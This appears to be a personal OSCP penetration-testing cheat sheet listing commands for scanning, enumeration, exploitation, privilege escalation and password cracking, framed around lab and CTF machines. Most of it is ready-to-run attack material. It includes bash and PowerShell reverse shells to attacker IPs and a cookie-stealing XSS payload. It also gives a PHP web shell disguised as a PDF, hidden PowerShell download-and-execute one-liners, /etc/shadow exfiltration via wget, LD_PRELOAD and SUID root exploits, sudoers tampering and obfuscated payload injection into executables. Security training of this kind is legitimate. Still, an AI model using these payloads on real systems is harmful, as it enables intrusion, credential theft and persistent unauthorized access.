![](https://images.credly.com/images/e3c9ad3c-b142-45ae-bb2b-2f19ff2b742a/PWK-OSCP-badge.png)
### OSCP Exam now has some major changes .... Those are -

![OSCP](OSCP-NEW.png)
![OSCP](OSCP-Changes.png)




*Ping Sweep*

    namp -v -sn 10.11.1.1-254 -oG ping sweep.txt
    grep Up ping-sweep.txt | cut -d “ ” -f 2

**Find ports**

*Fast UDP*

    nmap -Pn --top-ports 1000 -sU --stats-every 3m --max-retries 1 -T3 -oN /root/result.txt <ip>

    -sU                         UDP Scan

*Shell Script*

    #!/bin/bash
    if [ "$1" == "" ] || [ "$2" == "" ]; then
            echo "Arguments missing usage: <target_ip> <path to log>"
            exit 0
    fi
    sudo nmap -Pn --top-ports 1000 -sU --stats-every 3m --max-retries 1 -T3 -oN $2 $1

*TLS intensive* 

    nmap -Pn -sS --stats-every 3m --max-retries 1 --max-scan-delay 20 --defeat-rst-ratelimit -T4 -p1-65535 -oN /root/desktop/result.txt <ip>

    -Pn                         Do not ping the host
    -sS                         Stealth Scan
    --stats-every 3m            Every 3 Min information should come back
    --max-retries 1             Only try once
    --max-scan-delay 20         nmap should wait a specific time - avoid rait limit
    --defeat-rst-ratelimit      don't send ack just send rst to much ack can trigger rait limit - for filtered ports
    -T4                         Intesitiy of 4
    -p1-65535                   scan all ports
    -oN <where to save it>      save the result to a specific file
    <ip>                        ip e.g.
    
*Shell Script*

    #!/bin/bash
    if [ "$1" == "" ] || [ "$2" == "" ]; then
            echo "Arguments missing usage: <target_ip> <path to log>"
            exit 0
    fi
    sudo nmap -Pn -sS --stats-every 3m --max-retries 1 --max-scan-delay 20 --defeat-rst-ratelimit -T4 -p1-65535 -oN $2 $1

*Specific Ports Scan*

    nmap -Pn -nvv -p 22,80,8080 --version-intensity 9 -A -oN /home/kali/Desktop/result.txt <ip>

    -nvv 
    -Pn
    -p 22,80,111,139
    --version intensity 9 
    -A
    -oN /root/result.txt
    <ip>


*Shell Script*

    #!/bin/bash
    if [ "$1" == "" ] || [ "$2" == "" ] || [ "$3" == "" ]; then
            echo "Arguments missing usage: <target_ip> <ports to scan e.g: 80,443> <path to log>"
            exit 0
    fi
    sudo nmap -Pn -nvv -p $2 --version-intensity 9 -A -oN $3 $1

**Enumeration**

All kind of enumeration topics

*Curl the page*

    curl -v -X Options <ip>



**Search for Directories**

*dirb*

    dirb <url>

*dirbuster - with UI*

    dirbuster

Good to download a wordlist from github
take a big one and remove "manual"

*gobuster*

    gobuster dir -u <ip> -w /usr/share/wordlists/x
    
*dirsearch*
    dirsearch -u <url>

*feroxbuster*
    feroxbuster --ur <url>
    
**Enumeration**

*Wordpress Scan*

Plugins are having the potential of beeing outdated.

    wpscan --url <url> --enumerate ap,at,cd,dbe
    ap - include all Plugins
    at - include all themes
    cb - include all coonfig backups
    dbe - database exports

Check WP Logins by dir

    wpscan --url <url> --passwords /location/of/wordlist --usernames <name>

*analysis for vulnerabilities*

    nikto -h <ip> + port :80 or :443 

*SMB Enumeration*

    enum4linux -> 
        SMB Client 
        RPC Client
        NAT and MB Lookup

Has config bug
    locate smb.conf
    vim smb.conf

    under global add:
    client use spnego = no
    client ntlmv2 auth = no

*enum4linux <ip>*

find out SAMBA Version

    msfconsole
    search smb

search for an auxiliary scanner for smb with meatsploit

    use auxiliary/scanner/smb/smb_version
    put info - includes show options
    set rhost <ip>
    exploit
    --> gives you the version

    searchsploit samba 2.2
    see exploits compare them to exploit-db

    nbtscan <ip> - gives you basic info like NetBIOS Name

    smbclient -L <ip>

SAMBA is a good source for exploits

*Mount SMB share*

https://unix.stackexchange.com/questions/387468/mounting-a-windows-shared-drive-to-kali-linux 

to understand what shares are available

    smbclient -L hostname -I <ip>

to mount the folder

    mount //<ip>/<sharename> /media/<local_name> -o username=user

*Gaining Root with Metasploit*

    msfconsole
    search trans2open - use linux version
    show targets - there can be a lot of them
    show Options - to see the payload
    
If a static payload is set (to be seen by / in the path it can maybe not work).
Solution is to replace that with a generic payload.
https://blog.rapid7.com/2015/03/25/stageless-meterpreter-payloads/ 

Generic (non staged):

    set payload generic/shell_reverse_tcp

Staged:

    set payload generic/shell/reverse_tcp
    
exploit maybe leads to success
If it fails first try is the payload, then maybe it is the port. 

**DNS Enumeration**

*zonetransfer*

DNS Server

    host -t ns zonetransfer.me

Mail Server

    host -t mx zonetransfer.me

Host Information

    host zonetransfer.me

Zonetransfer information

    host -l zonetransfer.me <name server>

gives you unique dns/ip addresses

*dnsrecon*

    dnsrecon -d zonetransfer.me -t axfr
    axfr - for Zonetransfer

*dnsenum*

    dnsenum zonetransfer.me

its more clean and faster as the other ones

**other types**

    -FTP
    -SNMP
    -SMTP

**NetCat**

try connect to an open port
    
    nc -nv <ip> <port>

listening shell

    nc -nvlp <port>

connect

    nc -nv <ip> <port> -e cmd.exe
    -e execute


**Bruteforce attacks**

*Hydra for SSH*

Sample to attack Kioptrix

    locate wordlists

    hydra -v -l root -P /usr/share/wordlists/rockyou.txt <ip> ssh

    -v - verbose mode
    -P - Passwordlist

**XSS and MySQL FILE**

https://www.vulnhub.com/entry/pentester-lab-xss-and-mysql-file,66/ 
Only ISO for 64 bit
Debian 64 and Live image

*XSS*

    <script>alert('xss')</script>

create index.php and put it in the home directory of the user you will run it with

    <?php
        $cookie = isset($_GET["test"])?$_GET['test']:"";
    ?>

install it in a apache server run php 

    service apache2 stop
    php -S 10.0.2.6:80

in the vulnerable field enter

    <script>location.href='http://10.0.2.6/index.php?test='+document.cookie;</script>


*SQL injection*

https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/ 

*SQLMap*

Look for anything that looks like it trigger a sql query. Admin page requests posts with "id=1" in the URI. That is a good indicator that sql injection is possible here.

For testing

    sqlmap -u "http://10.0.2.7/admin/edit.php?id=1" --cookie=PHPSESSID=<id>

For dumping

    sqlmap -u "http://10.0.2.7/admin/edit.php?id=1" --cookie=PHPSESSID=<id> --dump

For getting a shell

    sqlmap -u "http://10.0.2.7/admin/edit.php?id=1" --cookie=PHPSESSID=<id> --os-shell

**Local File Inclusion (LFI)**

https://www.vulnhub.com/entry/pentester-lab-php-include-and-post-exploitation,79/ 

Nikto

    nikto -h 10.0.2.8

 Directory Traversal

    ../../../../../../../../../../etc/passwd

doesn't work
Adding a null byte does the trick until php 5.3

    ../../../../../../../../../../etc/passwd%00

Inject a file -> Submit allows to upload a pdf. Create a file that has a pdf header but contains php otherwise.

*shell.pdf*

    %PDF-1.4

    <?php
        system($_GET["cmd"]);
    ?>

that goes to upload page and can trigger a command

http://10.0.2.8/index.php?page=uploads/shell.pdf%00&cmd=whoami

Shellcode to create a reverse shell

    https://github.com/GammaG/php-reverse-shell

Get the php file and change the ip and port where the shell should connect to.

    nc -nvlp 4444

In Browser:

http://10.0.2.8/index.php?page=uploads/reverseshell.pdf%00

*Privilage Escalation*

find a folder with full rights -> tmp

**Remote File Inclusion (RFI)**

Host a file yourself and let the victim download it

*Damn Vulnerable Web Application (DVWA)*

http://www.dvwa.co.uk/

*Generate Reverse shell msfvenom*

    msfvenom -p php/meterpreter/revese_tcp LHOST=<host ip> LPORT=4444 >> exploit.php

host the file with python server

    service apache2 stop
    python -m SimpleHTTPServer 80

python give you debug information

*Setup meterpreter*

alternative to nc - only once allowed in OSCP better use nc

    sudo msfconsole -q -x "use exploit/multi/handler;\
    set payload php/meterpreter/reverse_tcp;\ 
    set LHOST 192.168.134.129;\
    set LPORT 4444 ;\
    run"

    -q - start quietly
    -x - passing payload settings

on DVWA the page is called via parameter "?page=" enter here the malicious page as goal

    dvwa.com/vulnerabilites/fi/?page=http://10.0.2.6/exploit.php

**File Transfer**

*Put with nmap*

    nmap -p 80 10.0.2.11 --script http-put --script-args http-put.url='<target path>',http-put.file='<local path>'

*Get with SCP*

    scp <user>@<ip>:<filename> <target>


*ftp hosting with python*

    apt-get install python-pyftpdlib
    go to the folder you want to use
    python -m pyftpdlib -p 21
    p for port

*get files over windows shell*

    ftp <ip>
    binary - so the files are having the correct chars

*script it*

    echo open <ip> ftp.txt
    echo anonymous >> ftp.txt
    echo pass >> ftp.txt
    echo get exploit.php >> ftp.txt
    echo bye >> gtp.txt

    ftp -s:ftp.txt

There should not be spaces in there

*host with msfconsole*

    use auxiliary/server/ftp
    exploit

For old windows machines

*TFTP*

    On Linux
    atftpd --daemon --port 69 /var/www/html

    On Windows
    tftp -i <ip> get exploit.php

*Powershell*

    echo $storage = $pwd > get.ps1
    echo $webclient = New-Object System.Net.Webclient >> get.ps1
    echo $url = "http://<ip>/exploit.php" >> get.ps1
    echo $file = "exploit.php" >> get.ps1
    echo $webclient.DownloadFile($url,$file) >> get.ps1

    powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File get.ps1

    Also works as oneliner 
    echo $storage = $pwd&$webclient = New-Object System.Net.Webclient&$url = "http://<ip>/exploit.php"&$file = "exploit.php"&$webclient.DownloadFile($url,$file) >> get.ps1

*Powershell One-Liner*

    powershell.exe -command PowerShell -ExecutionPolicy bypass -noprofile -windowstyle hidden -command (New-Object System.Net.WebClient).DownloadFile('<url>',"$env:APPDATA\ps.exe");Start-Process ("$env:APPDATA\ps.exe")


    ## Version1
    c:\Windows\System32\cmd.exe /c powershell.exe -w hidden -noni -nop -c "iex(New-Object System.Net.WebClient).DownloadString('<url>')"


    ## Version2
    c:\windows\system32\cmd.exe /c PowErsHelL.EXE -eXecUtiONPoLICy bYPass -NOPROfilE -WinDoWSTYlE hiDden -EnCodeDcOmmAnd <base64 Command>


**Privilege Escalation**

Guides for privilege Escalation

Basic Pentesting 1 OVA

https://www.vulnhub.com/entry/basic-pentesting-1,216/ 


*Guides*

**Windows**

https://www.fuzzysecurity.com/tutorials/16.html 


*Windows-PrivEsc-Checklist*

https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation

*Analysis Tools*

Executable

- winPEAS.exe https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS 

Deployment with Visual Studio Required

- Seatbelt.exe https://github.com/GhostPack/Seatbelt 
- Watson.exe https://github.com/rasta-mouse/Watson
- SharpUp.exe https://github.com/GhostPack/SharpUp

PowerShell

- Sherlock.ps1 https://github.com/rasta-mouse/Sherlock 
- PowerUp.ps1 https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc 
- jaws-enum.ps1 https://github.com/411Hall/JAWS

Other

- windows-exploit-suggester.py https://github.com/AonCyberLabs/Windows-Exploit-Suggester

    python2 -m pip install xlrd --upgrade
    python2 windows-exploit-suggester.py --update --gives the database for vulnerabilities
    C:\>systeminfo > win7sp1-systeminfo.txt
    python2 windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --systeminfo win7sp1-systeminfo.txt 

- exploit suggester (metasploit) https://blog.rapid7.com/2015/08/11/metasploit-local-exploit-suggester-do-less-get-more/ 

**Linux**

https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/ 


*Admin Shell upload - Wordpress*

Will create a reverse shell with a php shell and cleanup on its own. Need Wordpress admin access.

    use exploit/unix/webapp/wp_admin_shell_upload
    
*Find the Kernel version*

    uname -a -> on the local maschine

*Linuxprivchecker*

https://github.com/GammaG/linuxprivchecker

Then put in it apache directory. On the target machine make a file transfer to pull this.
This is the python version, but there are alternative versions.

    Copy the kernel as first thing and check if there is any exploits available.
    Check World Writeable Files (maybe passwd is in there)

End the Channel und go back to Meterpreter

    edit /etc/passwd
    (works as vi)

Open another terminal to generate the pw hash

    openssl passwd --help
    openssl passwd -1 (gives you an md5 hash)

Go back to meterpreter

    paste the hash instead of the "x" for root
    shell 
    python -c 'import pty; pty.spawn("/bin/bash")'
    su root

**Windows Enumeration**

*Check vulnerable services*

List all the running services on the maschine that are automatically started and non standard.

    wmic service get name,displayname,pathname,startmode |findstr /i "auto"|findstr /i /v "c:\windows" |findstr /i /v "\""
    wmic - gives a list of all running services
    /i - makes the search case insensitive
    /v ignores anything that contains the given String

Possible finding  C:\Program Files\... --> can be used by putting a file with name Files.exe under C:\Program

*check dir permissions*

    icacls "path"
    
*check for local admin*

    net localgroup administrators

*check user permissions*

    whoami /priv

*Generate Payload*

    msfvenom -p windows/meterpreter/reverse_tcp LHOST=<url> LPORT=<port> -e x86/shikata_ga_nai -i 7 -f raw > shell.bin
    -i - means the iterations shikata ga nai will execute on the payload

Inject the payload in a trustworthy exe like whoami.exe with the help of shellter

*Msfconsole meterpreter*

    msfconsole -q -x "use exploit/multi/handler;\
    set PAYLOAD windows/meterpreter/reverse_tcp;\
    set AutoRunScript post/windows/manage/migrate;\
    set LHOST <ip>;\
    set LPORT <port>;\
    run"

This will start a session handler and wait for incomming reverse shell requests. Then directly automigrate the process to a new process. 

*Set password for windows account*

    net user <accountname> <password>

**Linux Enumeration**

*ARP*

Show ARP Communication

    old: 
        arp -a
    new:
        ip neigh

Search for Passwords in  the whole system

    grep --color=auto -rnw '/' -ie "PASSWORD=" --color=always 2> /dev/null
    locate password | more

*Search for Subdomains*

Get the list from here
https://github.com/danielmiessler/SecLists/blob/master/Discovery/DNS/subdomains-top1million-5000.txt 

    wfuzz -c -f sub-fighter -w top5000.txt -u '<url>' -H "HOST: FUZZ.<url>" --hw 290

    --hw 290 to take out 404 pages

**Post Exploitation**

*Linux Post Exploitation*

https://github.com/mubix/post-exploitation/wiki/Linux-Post-Exploitation-Command-List 

    /bin/netstat -ano - to get open connections, maybe to get access to different networks

Search for flags as well

*Windows Post Exploitation*

    pwdump7

https://www.tarasco.org/security/pwdump_7/ 

    locate in Kali and transfer these files
    fgdump
    wce

*Unshadow*

Try to decrypt passwd and shadow file

    unshadow PASSWORD-FILE SHADOW-FILE

remove everything expect the users 

*Hashcat*

Identifiy the Algorithmus used for account creation
https://hashcat.net/wiki/doku.php?id=example_hashes

    hashcat64.exe -m Algorithm_Type_number cred.txt rockyou.txt -O
    for example (1800)

*GTFOBins*

Show what a user is allowed to execute as sudo without giving a password

    sudo -l

Exploit what is possible with that - search for GTFOBins 
https://gtfobins.github.io/ 
Use to escalate

*wget - Push /etc/shadow to remote location*

    sudo wget --post-file=/etc/shadow <IP>:<PORT>

Receive the file in NetCat

    nc -nvlp <PORT>

*LD_PRELOAD*

if sudo -l gives you back and you have at least one entry that allows sudo without pw

    env_keep+=LD_PRELOAD

create a file - shell.c - with the following content to escalate

    #include <stdio.h>
    #include <sys/types.h>
    #include <stdlib.h>

    void _init(){
        unsetenv("LD_PRELOAD");
        setgid(0);
        setuid(0);
        system("/bin/bash");
    }

compile it with

    gcc -fPIC -shared -o shell.so shell.c -nostartfiles

start it with

    sudo LD_PRELOAD=/home/USER/shell.so <something that can be executed as sudo e.g. apache2>

*FTP push file*

    ftp-upload -h {HOST} -u {USERNAME} --password {PASSWORD} -d {SERVER_DIRECTORY} {FILE_TO_UPLOAD}

*Capabilities*
Get a list of programs that are allowed to be executed as root by the current user.
Only works if +ep is present. 

    getcap -r / 2>/dev/null

Result should be something like this:

    /usr/bin/python = cap_setuid+ed

Get root with python

    python -c 'import os; os.setuid(0); os.system("/bin/bash")'

*Create Root Bash*

    echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash'
    For execution:
    /tmp/bash -p

*Use tar when wildcard is in use*

    echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > target_path/shell.sh
    chmod +x shell.sh
    touch /home/andre/backup/--checkpoint=1
    touch /home/andre/backup/--checkpoint-action=exec=sh\ shell.sh

When bash shows up

    /tmp/bash -p

*NFS Mounting*

it's based on root squash 

    cat /etc/exports

only works if something shows here with "no_root_squash"

    showmount -e <ip>
    mkdir /tmp/mountme
    mount -o rw,vers=2 <target_ip>:/<mountable_folder> /tmp/mountme

move over something like shell.c and gcc it + chmod +s it

*TTY*

If sudo -l shows tty is missing try to get a shell by using this:
https://netsec.ws/?p=337 

!exchange sh for bash

    python -c 'import pty; pty.spawn("/bin/bash")'
    echo os.system('/bin/bash')

*Upgrade TTY further*

Enables autocomplete in reverse shell and so on

Close the connection Strg + z

    stty raw -echo
    fg + enter (twice)

Back in the shell

    export TERM=xterm

*Monitor Process unprivileged*

    https://github.com/DominicBreuker/pspy 

**Windows Post Exploitation**

*Powershell Reverse Shell*

    $client = New-Object System.Net.Sockets.TCPClient("10.9.96.27",444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3 

**Windows PW Cracking**

*Crack Password Hash*

    john --wordlist=/root/rockyou.txt <dumpfile>
    john --show <dumpfile>

*Online Hashcracker*

Needs NTLM cracking for windows passwords.

https://hashkiller.io/listmanager 
https://hashes.com/decrypt/basic 
https://crackstation.net/ 

*Export User Passwords*

    reg SAVE HKLM\SAM C:\SAM
    reg SAVE HKLM\SYSTEM C:\SYSTEM

**Linux PW Cracking**

Unshadow

    unshadow passwd shadow > unshadow.txt

Cracking with John

    john --rules --wordlist=/root/rockyou.txt unshadow
    (will take forever)

Alternative:

    hashcat -m 500 /root/rockyou.txt unshadow

Good to export that to a different machine with a strong GPU (Tower)

https://hashcat.net/hashcat/ 
https://resources.infosecinstitute.com/hashcat-tutorial-beginners/ 


**Pivoting**

Tunneling into a different network via another machine.

*Setup a lab*

Go in virtual network editor

    Kali
        One Host-Only network with:
        Subnet IP   10.1.10.0
        Mask        255.255.255.255

    Windows in the middle    

    Victim
        One Nat Network with:
        Subnet IP   192.168.134.0
        Mask        255.255.255.0

*Metasploit*

    run autoroute -s 192.168.134.0/24
    run autoroute -p 

**CTF Notes**

*Reverse Shells*

http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet 

    bash -i >& /dev/tcp/10.0.0.1/4444 0>&1 

*Docker*

https://gtfobins.github.io/gtfobins/docker/ 

    docker run -v /:/mnt --rm -it bash chroot /mnt sh

bash maybe has to be changed into what is running

*SUID*

Get files that have the SUID Bit set 

First one is more clean

    find / -perm -u=s -type f 2>/dev/null

    find / -type f -perm -04000 -ls 2>/dev/null

good entry point is systemctl

https://gtfobins.github.io/

Search for systemcrl - SUID
paste the lines each single

    env - is a good point here 

*Escalate SUID Manually*

install strace for analysing what is called by an application

    strace patchToApplication 2>&1 | grep -i -E "open|access|no such file"

Search for something that you as user have writing permissions

Replace it with C script

    #include <stdio.h>
    #include <stdlib.h>

    static void inject() __attribute__((constructor));

    void inject() {
        system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
    }

Compile with

    gcc -shared -fPIC -o /pathToDeployTo /PathOfTheSourceFile

*Escalate with PATH manipulation*

Create an alternative "service" file to execute.
This will only with in combination with SUID.

    echo 'int main() { setgit(0); setuid(0); system("bin/bash"); return 0;}' > /tmp/service.c
    gcc /tmp/service.c -o /tmp/service
    export PATH=/tmp:$PATH

*Reverse Shell one liner*

http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet 

Make files downloadable

    sudo service apache2 start
    cp file /var/www/html
    id - gives you current rights 

*Priviledge Check*

https://github.com/GammaG/linuxprivchecker


*Create Reverse Shell*

https://netsec.ws/?p=331


**Set up Meterpreter session**

https://github.com/rapid7/metasploit-framework/wiki/How-to-use-a-reverse-shell-in-Metasploit

*Generate the payload*

    msfvenom -p php/meterpreter/reverse_tcp LHOST=<ip> LPORT=4444 EXITFUNC=thread -f raw > shell.php

https://github.com/pentestmonkey/php-reverse-shell 

*Meterpreter Session*

    ./msfconsole -q
    msf > use exploit/multi/handler
    msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
    payload => windows/meterpreter/reverse_tcp
    msf exploit(handler) > set lhost 192.168.1.123
    lhost => 192.168.1.123
    msf exploit(handler) > set lport 4444
    lport => 4444
    msf exploit(handler) > run

    shell - to get normal shell

*Get file version (Depackage)*

    dpkg -l | grep <file>

*Read exploits from searchsploit*

    /usr/share/exploitdb/exploits/linux/local/...

*add local user to sudoers*

    echo 'chmod 777 /etc/sudoers && echo "<user> ALL=NOPASSWD: ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update
    chmod 777 on the file

*push cron jobs*

    run-parts /etc/cron.daily

*Call URL via console*

    curl <url>

*Show open ports in kali*

    sudo netstat -tulpn

*Malicious Plugin*

    sudo apt install seclists

*Wordpress exploitation*

Once seclists are installed it can be found in /usr/share/seclists and the plugin can be found under Web-Shells/WordPress.
The malicious plugin is called "plugin-shell.php"

*Connect to MySQL DB in Kali*

    mysql --host=<ip> --port=<port> --user= <user> -p 
    ip - would be 127.0.0.1 in case of port forwarding
    port - the port where the portforward is running at

RDP

xfreerdp is preinstalled

    xfreerdp /d:<domain> /u:<user> /v:<target_ip> +clipboard

*Crack PGP/GPG private key*

https://www.openwall.com/lists/john-users/2015/11/17/1

    gpg2john target/tryhackme.asc > target/hash
    john --wordlist=modules/rockyou.txt output

    gpg --allow-secret-key-import --import tryhackme.asc
    gpg --delete-secret-keys "tryhackme"

*Writing space*

Space can be written as

    ${IFS}

so ls -la would be

    ls${IFS}-la

Execute Bash/Sh script

alternative to

     ./<script> 

you can also write 

  bash <script>


**Additional**

Good for notes is Cherrytree.
https://www.giuspen.com/cherrytree/#downl 

https://www.reddit.com/r/oscp/ 

**Mount shared Folder**

    #!/bin/bash
    sudo mount -t vboxsf share/~share


